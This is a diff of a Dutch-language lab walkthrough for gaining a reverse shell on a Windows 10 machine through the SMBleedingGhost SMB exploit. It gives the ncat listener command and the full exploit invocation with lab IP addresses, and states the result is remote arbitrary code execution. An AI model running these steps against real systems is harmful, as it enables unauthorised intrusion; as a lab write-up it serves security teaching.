@@ -62,12 +62,22 @@ Vulnerable
 
 ### Stap 2: Remote excecution uitvoeren
 * Juiste target offsets die passen voor slachtoffer zijn windows versie
-*we moeten in een terminal (op onze kali linux) `ncat -lvp <port>` runnen, dit zal onze toegang zijn naar onze windows (dit kan zijn ncat -lvp 1234)
-*we voeren `SMBleedingGhost.py` uit als volgt : `SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>`
+*Open een terminal op de Kali Linux en voer de volgende commando's uit.
+* `ncat -lvp <port>` : Dit zal onze toegang zijn naar onze windows (dit kan ncat -lvp 1234 zijn)
+* `SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>`
+* `target_ip` = 192.168.1.17  
+  `reverse_shell_ip` en `reverse_shell_port` zijn het ip address en poort waarop ncat luistert.
+*Het commando ziet er dus als volgt uit: `python3 SMBleedingGhost.py 192.168.1.17 192.168.1.20 1234`
 
-*`target_ip` is onze windows 10 slachtoffer, 192.168.1.17 dus. `reverse_shell_ip` en `reverse_shell_port` zijn de ip address en poort waarop ncat luistert
+### Stap 3: Resultaat
+* Na een tijdje zal de ncat terminal waarop er geluisterd wordt, veranderen naar een Windows 10 shell.
+* Nu heb je vanop afstand toegang, via een cmd, tot de target en kan je willekeurige code uitvoeren.
 
-*in ons geval zou onze code op zoiets lijken dus : `python3 SMBleedingGhost.py 192.168.1.17 192.168.1.20 1234`
+![alt text](images/image-2.png)
+
+![alt text](images/image-1.png)
+
+![alt text](images/image-3.png)
 
 
 
